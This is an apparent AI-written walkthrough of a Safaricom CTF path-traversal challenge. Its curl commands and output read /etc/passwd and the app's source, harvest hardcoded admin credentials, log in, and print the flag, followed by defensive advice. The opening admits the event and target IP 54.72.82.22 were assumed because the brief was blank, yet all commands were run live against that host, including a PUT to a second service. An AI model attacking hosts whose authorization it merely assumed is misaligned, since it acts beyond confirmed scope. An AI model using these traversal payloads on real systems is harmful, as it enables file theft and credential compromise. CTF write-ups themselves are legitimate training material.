# Safaricom CTF — Tomcat Path Traversal (Web, 450 pts)

> **Assumption:** the CHALLENGE CONTEXT block in the brief was blank, so I assumed
> the event is **Safaricom CTF (SAFCTF)**, category **Web**, difficulty **450 pts**,
> and the target is `http://54.72.82.22:8150` (with the hint's extra Tomcat service
> on `http://54.72.82.22:8240`). All commands and outputs below were captured live
> against that service.

## 1. Challenge Overview

"Tomcat Path Traversal" is a **450 pt web** challenge that presents a small page
called **BACKLOT 77** with a "PwnZone File Viewer" — an input box that claims to
read files from a `files/` folder. The goal is to abuse the file reader to reach
files outside that folder, steal an admin credential, and log in to the protected
**/admin** page to read the flag.

## 2. What You Need Before Starting

- **curl** — `sudo apt install curl` (Kali already has it).
- A browser (optional) to click the file-viewer buttons.
- No account, no VPN. The service listens on a raw IP/port.
- **Time estimate:** 30–50 minutes for a beginner. Most of the time goes into
  understanding *what* path the viewer accepts.

## 3. Reconnaissance

1. Fetch the home page:

```bash
curl -s -i -m 20 http://54.72.82.22:8150/ | head -40
```

Representative output (trimmed):

```http
HTTP/1.1 200 OK
Server: waitress
Content-Type: text/html; charset=utf-8
```

```html
<h1>📁 PwnZone File Viewer</h1>
<div class="controls">
  <input id="file" name="file" type="text" placeholder="Enter file path (e.g. files/welcome.txt)">
  <button id="viewBtn">View</button>
</div>
<div class="meta">Use the input above to view files.
  <span style="float:right"><a class="link" href="/admin">Admin</a></span></div>
```

**Why this matters:** the placeholder tells us the expected input — `files/welcome.txt` —
and the JavaScript shows the request is `GET /view?file=<what you typed>`. There is
also a tempting **/admin** link. So there are two interesting things: a file reader
and a protected admin page.

[SCREENSHOT: the BACKLOT 77 page showing the file-viewer input and the "Admin" link]

2. Read a legitimate sample so you know what "normal" looks like:

```bash
curl -s -i -m 15 "http://54.72.82.22:8150/view?file=files/welcome.txt" | head -20
```

Expected output:

```http
HTTP/1.1 200 OK
Content-Disposition: inline; filename=welcome.txt
Content-Type: text/plain; charset=utf-8
```

```
Welcome to PwnZone!
Try exploring the file viewer.
```

**Why this matters:** the `file` parameter is a **path** the server reads from disk.
If that path is not checked carefully, we can walk *out* of the intended folder.

3. Visit the admin page without credentials:

```bash
curl -s -i -m 15 http://54.72.82.22:8150/admin | head -20
```

Expected output:

```http
HTTP/1.1 401 UNAUTHORIZED
Www-Authenticate: Basic realm="CTF Admin Portal"

Authentication required.
```

**Why this matters:** HTTP **Basic authentication** (a username/password sent in a
header) protects `/admin`. To get in we need valid credentials — and the file reader
is how we will find them.

## 4. Identifying the Vulnerability

The vulnerability is **path traversal** (also called **directory traversal**): when
an application takes a filename from the user and reads it from disk without making
sure the user stayed inside the allowed folder. If the code does something like
`open(BASE_DIR + user_path)`, then a path containing `../` can climb up out of
`BASE_DIR`. Plus, because the code may also accept a leading `/`, an **absolute
path** like `/etc/passwd` can be read directly.

**Analogy:** imagine a filing clerk told to fetch documents "from the cabinet."
If you hand the clerk a note that says `../payroll/`, they obediently walk out of
the room instead of stopping at the cabinet door. Path traversal is that missing
door.

The tip-off during reconnaissance was step 2 above: the server happily read a
relative path we chose. The natural next test is `../../`.

## 5. Exploitation Step by Step

1. **Prove you can leave the intended folder.** Ask for `../../etc/passwd`, the
   classic test file that exists on every Linux box:

```bash
curl -s -m 15 "http://54.72.82.22:8150/view?file=../../etc/passwd" | head -5
```

Expected output:

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
```

**What to look for:** real `/etc/passwd` contents. This confirms the traversal
works — we are reading arbitrary files on the server.

[SCREENSHOT: curl output showing /etc/passwd contents from the /view endpoint]

2. **Find the application's own source code.** Most Python web apps live in `/app`.
   Ask for the source file directly by absolute path:

```bash
curl -s -m 15 "http://54.72.82.22:8150/view?file=/app/app.py" -o /tmp/app8150.py
grep -nE "ADMIN_USER|ADMIN_PASS|FLAG" /tmp/app8150.py
```

Expected output (trimmed):

```
ADMIN_USER = "panel_admin"
ADMIN_PASS = "k1tsune_2025!"
FLAG1 = os.getenv('FLAG')
```

**What to look for:** a hardcoded username and password. Developers sometimes leave
credentials in source code, and source code is just another file on disk.

3. **Read the `/view` route to understand exactly why it is broken** (optional, but
   very educational):

```bash
sed -n '129,153p' /tmp/app8150.py
```

Expected output:

```python
@app.route("/view")
def view_file():
    rel_path = request.args.get("file", "").strip()
    if not rel_path:
        return "Provide ?file=path", 400

    target_path = os.path.abspath(os.path.join(BASE_DIR, rel_path))

    # Intentionally vulnerable: naive check removed (for CTF)
    try:
        return send_file(target_path)
    except Exception as e:
        # For convenience, also allow reading absolute paths directly
        if os.path.isabs(rel_path) and os.path.exists(rel_path):
            return send_file(rel_path)
        return f"Error: {e}", 404
```

**What to look for:** there is no check that `target_path` is still inside
`BASE_DIR`. The comment even admits it.

4. **Use the stolen credentials to log in.** Basic auth is just a `-u user:pass`
   flag on curl:

```bash
curl -s -i -m 15 -u 'panel_admin:k1tsune_2025!' http://54.72.82.22:8150/admin
```

Expected output:

```http
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
```

```html
<h2>Admin Panel</h2><p>Nice work. Here's your flag: <strong>safctf{e9e46fabe7b282f4eb4eff39b378eff3}</strong></p>
```

**What to look for:** the `<strong>` element holds the flag.

[SCREENSHOT: the /admin response showing the Admin Panel and the flag]

### Optional browser walkthrough

1. Open `http://54.72.82.22:8150/` and type `../../etc/passwd` in the box, then
   click **View** — the output panel shows `/etc/passwd`.
2. Type `/app/app.py` and click **View** — the panel shows the source with the
   credentials.
3. Click the **Admin** link. The browser pops up a username/password dialog.
   Enter `panel_admin` / `k1tsune_2025!` and click **Sign in**.

[SCREENSHOT: the browser basic-auth dialog with the leaked credentials entered]

## 6. Capturing the Flag

The flag appears in the body of the authenticated `/admin` response:

```
safctf{e9e46fabe7b282f4eb4eff39b378eff3}
```

Copy the value between `<strong>` and `</strong>`.

## 7. Why This Works (Beginner Explanation)

The file viewer joins a folder and your input, then opens the result — but it never
verifies the result is still inside that folder. `../` means "go up one directory,"
so `../../etc/passwd` walks out of the public folder and lands on a system file.
Absolute paths like `/app/app.py` skip the folder entirely. Once source code is
readable, any secrets baked into it (like the `panel_admin` password) are lost.

In the real world this pattern is a serious bug: source files often contain API
keys, database passwords, or cloud credentials, and on some servers traversal can
even reach `/etc/shadow` or SSH keys. It is one of the most common vulnerabilities
found in bug-bounty programs, which is why "stop reading files outside the folder"
is a rule every developer has to enforce.

## 8. Common Mistakes and Dead Ends

- **Trying only `/admin` first.** Without credentials you just get a `401`. The
  file reader is the way to *get* the credentials, so solve that part first.
- **Forgetting the URL encoding / quoting.** Put the path in quotes in the shell and
  let curl send it: `".../view?file=/app/app.py"`. Spaces or `&` in a path will
  break the URL otherwise.
- **Chasing the port 8240 Tomcat service too early.** The hint mentions a "retired
  route" and a second Tomcat service, but the flag lives on `8150`'s `/admin`. On
  `8240` I only got `404`s and a `PUT` that did nothing — that was a dead end here.
- **Expecting `/view?file=/etc/passwd` to work.** In this app the absolute-path
  branch is a fallback, so it is safest to test `../../etc/passwd` *and* the plain
  absolute path; either may be the one that works depending on how the path is
  normalised.

## 9. How to Defend Against This

- **Resolve the final path and verify it is inside the allowed root** — e.g. compare
  `os.path.realpath(target)` against `os.path.realpath(BASE_DIR)` and refuse anything
  that does not start with the root.
- **Do not accept absolute paths** for user-chosen files; map user input to a fixed
  list of permitted files instead of open file paths.
- **Reject `..` segments** and strip/normalise the input *before* using it, and never
  trust the client to send a safe path.
- **Store secrets outside the source tree** (environment variables, a secret
  manager) and rotate any credential that ever lived in code.
- **Run the web app as an unprivileged user** in a container so a traversal bug can
  only read a limited set of files.

## 10. Key Takeaways

- A user-controlled file path is a path-traversal candidate; test `../../etc/passwd`
  and absolute paths like `/app/app.py`.
- `curl -u user:pass https://host/admin` sends HTTP Basic credentials.
- Source code is a file too — traversal turns "read a file" into "read the app's
  secrets."
- Save to your cheatsheet:
  `curl -s "http://TARGET/view?file=../../etc/passwd"` and
  `curl -s "http://TARGET/view?file=/app/app.py"`.
- **Flag:** `safctf{e9e46fabe7b282f4eb4eff39b378eff3}`

You just turned a simple "view a file" feature into admin access — that is a great
first traversal win.
